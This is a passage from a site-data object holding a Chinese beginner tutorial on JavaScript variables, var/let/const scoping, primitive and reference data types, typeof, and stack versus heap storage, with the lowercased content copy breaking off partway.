3,title:"关键字与保留字",slug:"关键字与保留字",normalizedTitle:"关键字与保留字",charIndex:211},{level:2,title:"变量",slug:"变量",normalizedTitle:"变量",charIndex:2},{level:3,title:"变量是什么?",slug:"变量是什么",normalizedTitle:"变量是什么?",charIndex:1356},{level:3,title:"声明变量",slug:"声明变量",normalizedTitle:"声明变量",charIndex:24},{level:3,title:"[es6]常量(Constants)",slug:"es6-常量-constants",normalizedTitle:"[es6]常量(constants)",charIndex:2786},{level:3,title:"变量声明兼容性",slug:"变量声明兼容性",normalizedTitle:"变量声明兼容性",charIndex:3395},{level:3,title:"let const var 区别",slug:"let-const-var-区别",normalizedTitle:"let const var 区别",charIndex:3443},{level:2,title:"数据类型",slug:"数据类型",normalizedTitle:"数据类型",charIndex:5},{level:3,title:"undefined",slug:"undefined",normalizedTitle:"undefined",charIndex:1935},{level:3,title:"null",slug:"null",normalizedTitle:"null",charIndex:900},{level:3,title:"string 类型",slug:"string-类型",normalizedTitle:"string 类型",charIndex:8836},{level:3,title:"number 类型",slug:"number-类型",normalizedTitle:"number 类型",charIndex:9537},{level:3,title:"BigInt 类型",slug:"bigint-类型",normalizedTitle:"bigint 类型",charIndex:10276},{level:3,title:"boolean 类型",slug:"boolean-类型",normalizedTitle:"boolean 类型",charIndex:11518},{level:3,title:"Symbol",slug:"symbol",normalizedTitle:"symbol",charIndex:7192},{level:3,title:"Object",slug:"object",normalizedTitle:"object",charIndex:189},{level:2,title:"判断数据类型",slug:"判断数据类型",normalizedTitle:"判断数据类型",charIndex:11770},{level:3,title:"语法",slug:"语法",normalizedTitle:"语法",charIndex:1821},{level:3,title:"返回值",slug:"返回值",normalizedTitle:"返回值",charIndex:11887},{level:3,title:"示例",slug:"示例",normalizedTitle:"示例",charIndex:3727},{level:2,title:"变量在内存划分",slug:"变量在内存划分",normalizedTitle:"变量在内存划分",charIndex:12532},{level:3,title:"堆栈的概念",slug:"堆栈的概念",normalizedTitle:"堆栈的概念",charIndex:12606},{level:3,title:"两种数据类型的存放",slug:"两种数据类型的存放",normalizedTitle:"两种数据类型的存放",charIndex:13213},{level:3,title:"变量复制",slug:"变量复制",normalizedTitle:"变量复制",charIndex:13612}],headersStr:"标识符命名规范 命名规范 关键字与保留字 变量 变量是什么? 声明变量 [es6]常量(Constants) 变量声明兼容性 let const var 区别 数据类型 undefined null string 类型 number 类型 BigInt 类型 boolean 类型 Symbol Object 判断数据类型 语法 返回值 示例 变量在内存划分 堆栈的概念 两种数据类型的存放 变量复制",content:'# 变量与数据类型\n\n> 请使用 var 运算符声明变量。\n\n\n# 标识符命名规范\n\n\n# 命名规范\n\n 1. 严格区分大小写；\n\n * 命名必须以字母或_或$开头，余下的部分可以是任意的字母，数字，或者是_或者是$；\n * 不能用关键字或者是保留字命名；\n * javascript 自己的命名习惯；\n   * 驼峰命名法：getElementById\n   * 首字母大写：Object\n * 命名要有意义。\n\n\n# 关键字与保留字\n\n * ECMA-262 定义了 ECMAScript 支持的一套关键字（keyword）、保留字（reserved word）。\n * 关键字标识了 ECMAScript 语句的开头和/或结尾。根据规定，关键字是保留的，不能用作变量名或函数名。\n * 保留字在某种意思上是为将来的关键字而保留的单词。因此保留字不能被用作变量名或函数名。\n\n关键字保留字                                                       \nabstract    arguments      boolean      break    byte        case\ncatch       char           class        const    continue    debugger\ndefault     delete         do           double   else        enum\neval        export         extends      false    final       finally\nfloat       for            function     goto     if          implements\nimport      in             instanceof   int      interface   let\nlong        native         new          null     package     private\nprotected   public         return       short    static      super\nswitch      synchronized   this         throws   transient   true\ntry         typeof         var          void     volatile    while\nwith        yield                                            \n\nWARNING\n\n如果将保留字用作变量名或函数名，那么除非将来的浏览器实现了该保留字，否则很可能收不到任何错误消息。当浏览器将其实现后，该单词将被看做关键字，如此将出现关键字错误。\n\nvar for = 123;\n//Uncaught SyntaxError: Unexpected token for\n\n\n\n# 变量\n\n\n# 变量是什么?\n\nWARNING\n\n变量，就是一个用于存放数值的容器。\n\nvar name = "张三";\nalert("hello "+name); // hello 张三\n\nvar num = 100;\nalert(num*10);        // 1000\n\n\nTIP\n\n变量是用来存储数值的。变量不是数值本身，它们仅仅是一个用于存储数值的容器。 你可以把变量想象成一个个用来装东西的纸箱子。\n\n * 变量的独特之处在于它存放的数值是可以改变的。\n * 变量它们能够存储任何的东西 -- 不只是字符串和数字。变量可以存储更复杂的数据，甚至是函数。\n\n\n# 声明变量\n\nJavaScript 有三种声明方式。\n\n关键词     描述                        版本\nvar     声明一个变量，可赋一个初始化值。          ES5\nlet     声明一个块作用域的局部变量，可赋一个初始化值。   ES6\nconst   声明一个块作用域的只读的命名常量。         ES6\n\n# 基本语法\n\n声明一个变量的语法是在 var 关键字之后加上这个变量的名字：\n\nvar myName;\nvar myAge;\n\n\n变量声明后，即可使用，以下通过输出变量方式来使用：\n\nconsole.log(myName);   //undefined\nconsole.log(myAge);    //undefined\n\n\n以上这两个变量并没有赋值，他们是空的容器(在 Javascript 中用 undefined 表示，未定义)。\n\n同时声明多个变量,通过,隔开：\n\nvar myName,myAge,mySex;\n\n\nTIP\n\n提示: 千万不要把两个概念弄混淆了，“一个变量存在，但是没有赋值”和“一个变量并不存在” — 他们完全是两回事.\n\n//声明未赋值\nvar myName;\nconsole.log(myName);     //输出undefined\n\n//未声明\nconsole.log(firstName);  //报错 firstName is not defined\n\n\nWARNING\n\n用 var 或 let 语句声明的变量，如果没有赋初始值，则其值为 undefined。\n\n# 初始化变量\n\n初始化变量有两种方式：\n\n 1. 先声明再初始化\n 2. 声明变量并初始化\n\n先声明再初始化，方法如下，在变量名之后跟上一个“=”，然后是值:\n\nvar myName;\nvar myAge;\n\nmyName="Nico";\nmyAge = 19;\n\nconsole.log(myName);  //输出 Nico\nconsole.log(myAge);   //输出 19\n\n\n【重点】声明变量并初始化:\n\nvar myName = "Nico";\nvar myAge = 19;\n\nconsole.log(myName);  //输出 Nico\nconsole.log(myAge);   //输出 19\n\n\n# 更新变量\n\n一旦变量赋值，您可以通过简单地给它一个不同的值来更新它。\n\nvar myName = \'Nico\';\nconsole.log(myName); //输出 Nico\n\nmyName = "Allcky";\nconsole.log(myName); //输出 Allcky\n\n\n\n# [es6]常量(Constants)\n\n你可以用关键字 const 创建一个只读的常量。\n\nconst PI = 3.141592654 ;\nconsole.log(PI); //输出 3.141592654\n\n\n * 常量不可以通过赋值改变其值，也不可以在脚本运行时重新声明。它必须被初始化为某个值。\n * 常量的作用域规则与 let 块级作用域变量相同。若省略 const 关键字，则该标识符将被视为变量。\n * 在同一作用域中，不能使用与变量名或函数名相同的名字来命名常量。\n\n不能使用与变量名或函数名相同的名字来命名常量，例如：\n\nfunction f() {};\nconst f = 5;\n//Uncaught SyntaxError: Identifier \'f\' has already been declared\n//语法错误： 标识符 \'f\' 已经被声明\n\n\n> 常量标识符的命名规则和变量相同：必须以字母、下划线或美元符号开头并可以包含有字母、数字或下划线。\n\n常量对象的属性是不受保护的,所以可以修改常量对象的属性，例如：\n\nconst MY_OBJECT = {"key": "value"};\nMY_OBJECT.key = "otherValue";\n\n\n> 利用 ES6 中对象的方法 Object.freeze()可将对象冻结，从而无法修改其属性 (详见Object对象一节)\n\n\n# 变量声明兼容性\n\n> let 与 const是 ES6 新增声明方式，其存在兼容问题：\n\n\n# let const var 区别\n\n# var\n\n 1. var 声明作用域 关键的问题在于，使用 var 操作符定义的变量会成为包含它的函数的局部变量。比如，使用 var 在一个函数内部定义一个变量，就意味着该变量将在函数退出时被销毁：\n\nfunction test() { \n var message = "hi"; // 局部变量\n} \ntest(); \nconsole.log(message); // 出错！\n\n\n这里，message 变量是在函数内部使用 var 定义的。函数叫 test()，调用它会创建这个变量并给 它赋值。调用之后变量随即被销毁，因此示例中的最后一行会导致错误。不过，在函数内定义变量时省 略 var 操作符，可以创建一个全局变量：\n\nfunction test() { \n message = "hi"; // 全局变量\n} \ntest(); \nconsole.log(message); // "hi"\n\n\n去掉之前的 var 操作符之后，message 就变成了全局变量。只要调用一次函数 test()，就会定义 这个变量，并且可以在函数外部访问到。\n\n 2. var 声明提升 使用 var 时，下面的代码不会报错。这是因为使用这个关键字声明的变量会自动提升到函数作用域 顶部：\n\nfunction foo() { \n console.log(age); \n var age = 26; \n} \nfoo(); // undefined \n// 之所以不会报错，是因为 ECMAScript 运行时把它看成等价于如下代码：\nfunction foo() { \n var age; \n console.log(age); \n age = 26; \n} \nfoo(); // undefined \n\n\nfunction foo() { \n var age = 16; \n var age = 26; \n var age = 36; \n console.log(age); \n} \nfoo(); // 36\n\n\n# let\n\n> let 跟 var 的作用差不多，但有着非常重要的区别。最明显的区别是，let 声明的范围是块作用域， 而 var 声明的范围是函数作用域。\n\n// var\nif (true) { \n var name = \'Matt\'; \n console.log(name); // Matt \n} \nconsole.log(name); // Matt \n// let\nif (true) { \n let age = 26; \n console.log(age); // 26 \n} \nconsole.log(age); // ReferenceError: age 没有定义\n\n// 重复声明\nvar name; \nvar name; \n\nlet age; \nlet age; // SyntaxError；标识符 age 已经声明过了\n\n\nJavaScript 引擎会记录用于变量声明的标识符及其所在的块作用域，因此嵌套使用相同的标 识符不会报错，而这是因为同一个块中没有重复声明：\n\nvar name = \'Nicholas\'; \nconsole.log(name); // \'Nicholas\' \nif (true) { \n var name = \'Matt\'; \n console.log(name); // \'Matt\' \n} \nlet age = 30; \nconsole.log(age); // 30 \nif (true) { \n let age = 26; \n console.log(age); // 26 \n} \n\n\n对声明冗余报错不会因混用 let 和 var 而受影响。这两个关键字声明的并不是不同类型的变量， 它们只是指出变量在相关作用域如何存在。\n\nvar name; \nlet name; // SyntaxError \nlet age; \nvar age; // SyntaxError\n\n\n暂时性死区 let 与 var 的另一个重要的区别，就是 let 声明的变量不会在作用域中被提升。\n\n// name 会被提升\nconsole.log(name); // undefined \nvar name = \'Matt\'; \n// age 不会被提升\nconsole.log(age); // ReferenceError：age 没有定义\nlet age = 26; \n\n\n在解析代码时，JavaScript 引擎也会注意出现在块后面的 let 声明，只不过在此之前不能以任何方 式来引用未声明的变量。在 let 声明之前的执行瞬间被称为“暂时性死区”（temporal dead zone），在此 阶段引用任何后面才声明的变量都会抛出 ReferenceError。\n\n全局声明 与 var 关键字不同，使用 let 在全局作用域中声明的变量不会成为 window 对象的属性（var 声 明的变量则会）。\n\n条件声明 在使用 var 声明变量时，由于声明会被提升，JavaScript 引擎会自动将多余的声明在作用域顶部合 并为一个声明。因为 let 的作用域是块，所以不可能检查前面是否已经使用 let 声明过同名变量，同 时也就不可能在没有声明的情况下声明它。\n\n<script> \n var name = \'Nicholas\'; \n let age = 26; \n<\/script> \n<script> \n // 假设脚本不确定页面中是否已经声明了同名变量\n // 那它可以假设还没有声明过\n var name = \'Matt\'; \n // 这里没问题，因为可以被作为一个提升声明来处理\n // 不需要检查之前是否声明过同名变量\n let age = 36; \n // 如果 age 之前声明过，这里会报错\n<\/script> \n// 使用 try/catch 语句或 typeof 操作符也不能解决，因为条件块中 let 声明的作用域仅限于该块。\n<script> \n let name = \'Nicholas\'; \n let age = 36; \n<\/script> \n<script> \n // 假设脚本不确定页面中是否已经声明了同名变量\n // 那它可以假设还没有声明过\n if (typeof name === \'undefined\') { \n let name; \n } \n // name 被限制在 if {} 块的作用域内\n // 因此这个赋值形同全局赋值\n name = \'Matt\'; \n try { \n console.log(age); // 如果 age 没有声明过，则会报错\n } \n catch(error) { \n let age;\n  } \n // age 被限制在 catch {}块的作用域内\n // 因此这个赋值形同全局赋值\n age = 26; \n<\/script>\n\n\nvar name = \'Matt\'; \nconsole.log(window.name); // \'Matt\' \nlet age = 26; \nconsole.log(window.age); // undefined\n\n\nconst\n\nconst实际上保证的，并不是变量的值不得改动，而是变量指向的那个内存地址所保存的数据不得改动。对于简单类型的数据（数值、字符串、布尔值），值就保存在变量指向的那个内存地址，因此等同于常量。但对于复合类型的数据（主要是对象和数组），变量指向的内存地址，保存的只是一个指向实际数据的指针，const只能保证这个指针是固定的（即总是指向另一个固定的地址），至于它指向的数据结构是不是可变的，就完全不能控制了。因此，将一个对象声明为常量必须非常小心。\n\nconst foo = {};\n\n// 为 foo 添加一个属性，可以成功\nfoo.prop = 123;\nfoo.prop // 123\n\n// 将 foo 指向另一个对象，就会报错\nfoo = {}; // TypeError: "foo" is read-only\n\n\n\nES6 声明变量的六种方法\n\nES5 只有两种声明变量的方法：var命令和function命令。ES6 除了添加let和const命令，后面章节还会提到，另外两种声明变量的方法：import命令和class命令。所以，ES6 一共有 6 种声明变量的方法\n\n\n# 数据类型\n\n计算机顾名思义就是可以做数学计算的机器，因此，计算机程序理所当然地可以处理各种数值。但是，计算机能处理的远不止数值，还可以处理文本、图形、音频、视频、网页等各种各样的数据，不同的数据，需要定义不同的数据类型。\n\n在 JavaScript 中定义了以下几种数据类型：\n\n * ECMAScript 有 6 种初始类型（primitive type），即 Undefined、Null、Boolean、Number、String和 ES6 新增的Symbol 以及 ES2020新增的数据类型。\n * ECMAScript 有 1 种引用类型，即Object\n\n分类     类型            值\n初始类型   undefined     undefined\n       null          一个表明 null 值的特殊关键字。 JavaScript 是大小写敏感的，因此 null 与\n                     Null、NULL或其他变量完全不同。\n       string        单双引号引起来的数据\n       number        包括整型和浮点型。科学计数法。支持二进制、八进制、十进制、十六进制。\n       BigInt（大整数）   ES2020 引入了一种新的数据类型 BigInt（大整数），这是 ECMAScript 的第八种数据类型。BigInt\n                     只用来表示整数，没有位数的限制，任何位数的整数都可以精确表示。\n       boolean       true false\n       Symbol        表示独一个一无二的值。(ES6新增)\n引用类型   Object        包含相关属性和方法的一个集合。包含Function、Array、Object\n\n\n# undefined\n\nundefined 未定义，指的就是变量创建后但是没有赋值，而变量的默认值就是undefined.\n\n如：\n\nvar a;\nconsole.log(a); // undefined\n\n\n\n# null\n\nnull 一个表明 null 值的特殊关键字，相当于一个占位符。JavaScript 是大小写敏感的，因此 null 与 Null、NULL 或其他变量完全不同。\n\nNull 类型同样只有一个值，即特殊值 null。逻辑上讲，null 值表示一个空对象指针，这也是给 typeof 传一个 null 会返回"object"的原因：\n\nlet car = null; \nconsole.log(typeof car); // "object"\n\n\n在定义将来要保存对象值的变量时，建议使用 null 来初始化，不要使用其他值。这样，只要检查 这个变量的值是不是 null 就可以知道这个变量是否在后来被重新赋予了一个对象的引用，比如：\n\nif (car != null) { \n // car 是一个对象的引用\n} \n\n\nundefined 值是由 null 值派生而来的，因此 ECMA-262 将它们定义为表面上相等，如下面的例 子所示：\n\nconsole.log(null == undefined); // true \n\n\n用等于操作符（==）比较 null 和 undefined 始终返回 true。但要注意，这个操作符会为了比较 而转换它的操作数 即使 null 和 undefined 有关系，它们的用途也是完全不一样的。如前所述，永远不必显式地将 变量值设置为 undefined。但 null 不是这样的。任何时候，只要变量要保存对象，而当时又没有那个 对象可保存，就要用 null 来填充该变量。这样就可以保持 null 是空对象指针的语义，并进一步将其 与 undefined 区分开来。 null 是一个假值。因此，如果需要，可以用更简洁的方式检测它。不过要记住，也有很多其他可 能的值同样是假值。所以一定要明确自己想检测的就是 null 这个字面值，而不仅仅是假值。\n\nlet message = null; \nlet age; \nif (message) { \n // 这个块不会执行\n} \nif (!message) { \n // 这个块会执行\n} \n\nif (age) { \n // 这个块不会执行\n} \nif (!age) { \n // 这个块会执行\n}\n\n\n\n# string 类型\n\n用单双引号来说明，他所包围的值都可以是字符串。\n\n> 引号包裹的字符串中间不允许换行\n\n单双引号的用法：\n\n * 效率是一样的\n * 只能成对出现，不能相互交叉使用\n * 可以相互嵌套。\n\n还包括一些特殊的字符:\n\n字符          描述\n\\0          Null 字节\n\\b          退格符\n\\f          换页符\n\\n          换行符\n\\r          回车符\n\\t          Tab (制表符)\n\\v          垂直制表符\n\'           单引号\n"           双引号\n\\           反斜杠字符（\\）\n\\XXX        由从 0 到 377 最多三位八进制数 XXX 表示的 Latin-1 字符。例如，\\251 是版权符号的八进制序列。\n\\xXX        由从 00 和 FF 的两位十六进制数字 XX 表示的 Latin-1 字符。例如，\\ xA9\n            是版权符号的十六进制序列。\n\\uXXXX      由四位十六进制数字 XXXX 表示的 Unicode 字符。例如，\\ u00A9 是版权符号的 Unicode 序列。见\n            Unicode escape sequences (Unicode 转义字符).\n\\u{XXXXX}   Unicode 代码点 (code point) 转义字符。例如，\\u{2F804} 相当于 Unicode 转义字符\n            \\uD87E\\uDC04 的简写。\n\n\n# number 类型\n\nnumber 类型包括整型和浮点型。支持十进制（基数为 10）、十六进制（基数为 16）、八进制（基数为 8）以及二进制（基数为 2）表示。\n\n进制     表示\n十进制    十进制整数字面量由一串数字序列组成，且没有前缀 0。\n八进制    八进制的整数以 0（或 0O、0o）开头，只能包括数字 0-7。\n十六进制   十六进制整数以 0x（或 0X）开头，可以包含数字（0-9）和字母 a~f 或 A~F。\n二进制    二进制整数以 0b（或 0B）开头，只能包含数字 0 和 1。\n\nvar n1 = 100; //十进制\n\nvar n2 = 071;  //八进制\nvar n3 = 0o71; //八进制 ES6规定 0o开头\n\nvar n4 = 0xa9; //十六进制\n\nvar n5 = 0b11; //二进制\n\n\n> 严格模式下，八进制整数字面量必须以 0o 或 0O 开头，而不能以 0 开头。\n\n对于非常大或非常小的数，可以用科学计数法表示，可以把一个数表示为数字（包括十进制数字）加 e（或 E），后面加乘以 10 的倍数。例如：\n\n# 用科学计数法来表示，还包括一些特殊的值：\n# 最大值\nNumber.MAX_VALUE    //1.7976931348623157e+308\n\n# 最小值\nNumber.MIN_VALUE    //5e-324\n\nvar n1 = 3e2; //3*100 = 300\nvar n2 = 5e3; //5*1000 = 5000\nvar n3 = 5.3e3; //5.3*1000 = 5300\n\n# 无穷大\nInfinity    // 1/0 = Infinity\n\n\n\n# BigInt 类型\n\nTIP\n\nJavaScript 所有数字都保存成 64 位浮点数，这给数值的表示带来了两大限制。一是数值的精度只能到 53 个二进制位（相当于 16 个十进制位），大于这个范围的整数，JavaScript 是无法精确表示的，这使得 JavaScript 不适合进行科学和金融方面的精确计算。二是大于或等于2的1024次方的数值，JavaScript 无法表示，会返回Infinity。\n\n// 超过 53 个二进制位的数值，无法保持精度\nMath.pow(2, 53) === Math.pow(2, 53) + 1 // true\n\n// 超过 2 的 1024 次方的数值，无法表示\nMath.pow(2, 1024) // Infinity\n\n\n> ES2020 引入了一种新的数据类型 BigInt（大整数），来解决这个问题，这是 ECMAScript 的第八种数据类型。BigInt 只用来表示整数，没有位数的限制，任何位数的整数都可以精确表示。\n\nconst a = 2172141653n;\nconst b = 15346349309n;\n\n// BigInt 可以保持精度\na * b // 33334444555566667777n\n\n// 普通整数无法保持精度\nNumber(a) * Number(b) // 33334444555566670000\n\n\nTIP\n\n为了与 Number 类型区别，BigInt 类型的数据必须添加后缀n。\n\n1234 // 普通整数\n1234n // BigInt\n\n// BigInt 的运算\n1n + 2n // 3n\n\n\nBigInt 同样可以使用各种进制表示，都要加上后缀n。\n\n0b1101n // 二进制\n0o777n // 八进制\n0xFFn // 十六进制\n\n\nBigInt 与普通整数是两种值，它们之间并不相等。\n\n42n === 42 // false\n\n\ntypeof运算符对于 BigInt 类型的数据返回bigint。\n\ntypeof 123n // \'bigint\'\n\n\nBigInt 可以使用负号（-），但是不能使用正号（+），因为会与 asm.js 冲突。\n\n-42n // 正确\n+42n // 报错\n\n\nJavaScript 以前不能计算70的阶乘（即70!），因为超出了可以表示的精度。\n\nlet p = 1;\nfor (let i = 1; i <= 70; i++) {\n  p *= i;\n}\nconsole.log(p); // 1.197857166996989e+100\n\n\n现在支持大整数了，就可以算了，浏览器的开发者工具运行下面代码，就OK。\n\nlet p = 1n;\nfor (let i = 1n; i <= 70n; i++) {\n  p *= i;\n}\nconsole.log(p); // 11978571...00000000n\n\n\n\n# boolean 类型\n\nBoolean. 布尔值，true 和 false. 表示"真"和"假"\n\n\n# Symbol\n\nSymbol ( 在 ECMAScript 6 中新添加的类型).。一种数据类型，它的实例是唯一且不可改变的。凡是属性名属于 Symbol 类型，就都是独一无二的，可以保证不会与其他属性名产生冲突。\n\n\n# Object\n\n引用类型: 引用类型是一种数据结构，用于将数据和功能组织在一起，存储大量的数据\n\n> 三大引用类型: Object 、Array 、Function\n\n\n# 判断数据类型\n\n当我们想知道一个变量中存储的数据类型是什么，我们可以通过 typeof 运算符。\n\n\n# 语法\n\ntypeof运算符后跟操作数：\n\ntypeof operand;\n// or\ntypeof operand;\n\n\n\n# 返回值\n\n下表总结了typeof可能的返回值\n\n类型          结果\nUndefined   "undefined"\nNull        "object"\nBoolean     "boolean"\nNumber      "number"\nString      "string"\nSymbol      "symbol"\nBigInt      "bigint"\n函数对象        "function"\n任何其他对象      "object"\n\nWARNING\n\n注意 严格来讲，函数在 ECMAScript 中被认为是对象，并不代表一种数据类型。可是， 函数也有自己特殊的属性。为此，就有必要通过 typeof 操作符来区分函数和其他对象。\n\n\n# 示例\n\n// typeof总是返回一个字符串\ntypeof typeof 1 === "string";\n\n// Number\ntypeof 37 === "number";\ntypeof NaN === "number";\ntypeof Math.PI === "number";\n\n// String\ntypeof "" === "string";\ntypeof "bla" === "string";\n\n// Object\ntypeof { a: 1 } === "object";\ntypeof [1, 2, 4] === "object";\ntypeof null === "object";\n\n\n\n# 变量在内存划分\n\n> 变量类型分两种是由于其在内存中存储方式不同：基本类型的数据是存放在栈内存中的，而引用类型的数据是存放在堆内存中的\n\n\n\n\n# 堆栈的概念\n\n两者都是存放临时数据的地方。\n\n# 栈\n\n栈（数据结构）：一种先进后出的数据结构。\n\n栈区（stack） 由编译器自动分配释放 ，存放函数的参数值，局部变量的值等。\n\n\n\n这种乒乓球的存放方式与栈中存取数据的方式如出一辙。处于盒子中最顶层的乒乓球 5，它一定是最后被放进去，但可以最先被使用。而我们想要使用底层的乒乓球 1，就必须将上面的 4 个乒乓球取出来，让乒乓球 1 处于盒子顶层。这就是栈空间先进后出，后进先出的特点。图中已经详细的表明了栈空间的存储原理。\n\n# 堆\n\n堆（数据结构）：堆可以被看成是一棵树，如：堆排序；\n\n堆区（heap） 一般由程序员分配释放，若程序员不释放，程序结束时可能由 OS 回收。\n\n堆数据结构是一种树状结构。它的存取数据的方式，则与书架与书非常相似。\n\n书虽然也整齐的存放在书架上，但是我们只要知道书的名字，我们就可以很方便的取出我们想要的书，而不用像从乒乓球盒子里取乒乓一样，非得将上面的所有乒乓球拿出来才能取到中间的某一个乒乓球。好比在 JSON 格式的数据中，我们存储的 key-value 是可以无序的，因为顺序的不同并不影响我们的使用，我们只需要关心书的名字\n\n堆是在程序运行时，而不是在程序编译时，申请某个大小的内存空间。即动态分配内存，对其访问和对一般内存的访问没有区别。对于堆，我们可以随心所欲的进行增加变量和删除变量，不用遵循次序。\n\n\n# 两种数据类型的存放\n\n# 栈区存储\n\nJavaScript 的基础数据类型往往都会保存在变量对象中,即保存在栈内存中，因为这些类型在内存中分别占有固定大小的空间，通过按值来访问。 基本类型由于数据简单，会存放到内存栈区，栈区包括了 变量的标识符和变量的值：\n\n\n> 栈区： 长度固定，读取速度快\n\n# 堆区存储\n\nJS 的引用数据类型，比如数组 Array，Object,它们值的大小是不固定的。引用数据类型的值是保存在堆内存中的对象。JavaScript 不允许直接访问堆内存中的位置，因此我们不能直接操作对象的堆内存空间。在操作对象时，实际上是在操作对象的引用而不是实际的对象。因此，引用类型的值都是按引用访问的。这里的引用，我们可以理解为保存在变量对象中的一个地址，该地址与堆内存的实际值相关联。\n\n我们可以结合以下例子与图解进行理解:\n\n\n\n\n\n> 堆区： 长度不固定，读取速度慢\n\n\n# 变量复制\n\n# 基本数据类型\n\n基本数据类型：基本数据类型值指保存在栈内存中的简单数据段。访问方式是按值访问。\n\nvar a = 1;\n\n\n\n\n操作的是变量实际保存的值。\n\na = 2;\n\n\n\n\n基本类型变量的复制：从一个变量向一个变量复制时，会在栈中创建一个新值，然后把值复制到为新变量分配的位置上。\n\nvar b = a;\n\n\n\n\nb = 2;\n\n\n\n\n# 引用数据类型\n\n引用数据类型：引用数据类型值指保存在堆内存中的对象。也就是，变量中保存的实际上的只是一个指针，这个指针指向内存中的另一个位置，该位置保存着对象。访问方式是按引用访问。\n\nvar a = new Object();\n\n\n\n\n当操作时，需要先从栈中读取内存地址，然后再延指针找到保存在堆内存中的值再操作。\n\na.name = \'xz\';\n\n\n\n\n引用类型变量的复制：复制的是存储在栈中的指针，将指针复制到栈中未新变量分配的空间中，而这个指针副本和原指针指向存储在堆中的同一个对象；复制操作结束后，两个变量实际上将引用同一个对象。因此，在使用时，改变其中的一个变量的值，将影响另一个变量。\n\nvar b = a;\n\n\n\n\nb.sex = \'boy\';\n\n\n\n\nconsole.log(a.sex) //boy\nconsole.log(b.sex) //boy\n\n\n * 参考 1\n * 参考 2',normalizedContent:'# 变量与数据类型\n\n> 请使用 var 运算符声明变量。\n\n\n# 标识符命名规范\n\n\n# 命名规范\n\n 1. 严格区分大小写；\n\n * 命名必须以字母或_或$开头，余下的部分可以是任意的字母，数字，或者是_或者是$；\n * 不能用关键字或者是保留字命名；\n * javascript 自己的命名习惯；\n   * 驼峰命名法：getelementbyid\n   * 首字母大写：object\n * 命名要有意义。\n\n\n# 关键字与保留字\n\n * ecma-262 定义了 ecmascript 支持的一套关键字（keyword）、保留字（reserved word）。\n * 关键字标识了 ecmascript 语句的开头和/或结尾。根据规定，关键字是保留的，不能用作变量名或函数名。\n * 保留字在某种意思上是为将来的关键字而保留的单词。因此保留字不能被用作变量名或函数名。\n\n关键字保留字                                                       \nabstract    arguments      boolean      break    byte        case\ncatch       char           class        const    continue    debugger\ndefault     delete         do           double   else        enum\neval        export         extends      false    final       finally\nfloat       for            function     goto     if          implements\nimport      in             instanceof   int      interface   let\nlong        native         new          null     package     private\nprotected   public         return       short    static      super\nswitch      synchronized   this         throws   transient   true\ntry         typeof         var          void     volatile    while\nwith        yield                                            \n\nwarning\n\n如果将保留字用作变量名或函数名，那么除非将来的浏览器实现了该保留字，否则很可能收不到任何错误消息。当浏览器将其实现后，该单词将被看做关键字，如此将出现关键字错误。\n\nvar for = 123;\n//uncaught syntaxerror: unexpected token for\n\n\n\n# 变量\n\n\n# 变量是什么?\n\nwarning\n\n变量，就是一个用于存放数值的容器。\n\nvar name = "张三";\nalert("hello "+name); // hello 张三\n\nvar num = 100;\nalert(num*10);        // 1000\n\n\ntip\n\n变量是用来存储数值的。变量不是数值本身，它们仅仅是一个用于存储数值的容器。 你可以把变量想象成一个个用来装东西的纸箱子。\n\n * 变量的独特之处在于它存放的数值是可以改变的。\n * 变量它们能够存储任何的东西 -- 不只是字符串和数字。变量可以存储更复杂的数据，甚至是函数。\n\n\n# 声明变量\n\njavascript 有三种声明方式。\n\n关键词     描述                        版本\nvar     声明一个变量，可赋一个初始化值。          es5\nlet     声明一个块作用域的局部变量，可赋一个初始化值。   es6\nconst   声明一个块作用域的只读的命名常量。         es6\n\n# 基本语法\n\n声明一个变量的语法是在 var 关键字之后加上这个变量的名字：\n\nvar myname;\nvar myage;\n\n\n变量声明后，即可使用，以下通过输出变量方式来使用：\n\nconsole.log(myname);   //undefined\nconsole.log(myage);    //undefined\n\n\n以上这两个变量并没有赋值，他们是空的容器(在 javascript 中用 undefined 表示，未定义)。\n\n同时声明多个变量,通过,隔开：\n\nvar myname,myage,mysex;\n\n\ntip\n\n提示: 千万不要把两个概念弄混淆了，“一个变量存在，但是没有赋值”和“一个变量并不存在” — 他们完全是两回事.\n\n//声明未赋值\nvar myname;\nconsole.log(myname);     //输出undefined\n\n//未声明\nconsole.log(firstname);  //报错 firstname is not defined\n\n\nwarning\n\n用 var 或 let 语句声明的变量，如果没有赋初始值，则其值为 undefined。\n\n# 初始化变量\n\n初始化变量有两种方式：\n\n 1. 先声明再初始化\n 2. 声明变量并初始化\n\n先声明再初始化，方法如下，在变量名之后跟上一个“=”，然后是值:\n\nvar myname;\nvar myage;\n\nmyname="nico";\nmyage = 19;\n\nconsole.log(myname);  //输出 nico\nconsole.log(myage);   //输出 19\n\n\n【重点】声明变量并初始化:\n\nvar myname = "nico";\nvar myage = 19;\n\nconsole.log(myname);  //输出 nico\nconsole.log(myage);   //输出 19\n\n\n# 更新变量\n\n一旦变量赋值，您可以通过简单地给它一个不同的值来更新它。\n\nvar myname = \'nico\';\nconsole.log(myname); //输出 nico\n\nmyname = "allcky";\nconsole.log(myname); //输出 allcky\n\n\n\n# [es6]常量(constants)\n\n你可以用关键字 const 创建一个只读的常量。\n\nconst pi = 3.141592654 ;\nconsole.log(pi); //输出 3.141592654\n\n\n * 常量不可以通过赋值改变其值，也不可以在脚本运行时重新声明。它必须被初始化为某个值。\n * 常量的作用域规则与 let 块级作用域变量相同。若省略 const 关键字，则该标识符将被视为变量。\n * 在同一作用域中，不能使用与变量名或函数名相同的名字来命名常量。\n\n不能使用与变量名或函数名相同的名字来命名常量，例如：\n\nfunction f() {};\nconst f = 5;\n//uncaught syntaxerror: identifier \'f\' has already been declared\n//语法错误： 标识符 \'f\' 已经被声明\n\n\n> 常量标识符的命名规则和变量相同：必须以字母、下划线或美元符号开头并可以包含有字母、数字或下划线。\n\n常量对象的属性是不受保护的,所以可以修改常量对象的属性，例如：\n\nconst my_object = {"key": "value"};\nmy_object.key = "othervalue";\n\n\n> 利用 es6 中对象的方法 object.freeze()可将对象冻结，从而无法修改其属性 (详见object对象一节)\n\n\n# 变量声明兼容性\n\n> let 与 const是 es6 新增声明方式，其存在兼容问题：\n\n\n# let const var 区别\n\n# var\n\n 1. var 声明作用域 关键的问题在于，使用 var 操作符定义的变量会成为包含它的函数的局部变量。比如，使用 var 在一个函数内部定义一个变量，就意味着该变量将在函数退出时被销毁：\n\nfunction test() { \n var message = "hi"; // 局部变量\n} \ntest(); \nconsole.log(message); // 出错！\n\n\n这里，message 变量是在函数内部使用 var 定义的。函数叫 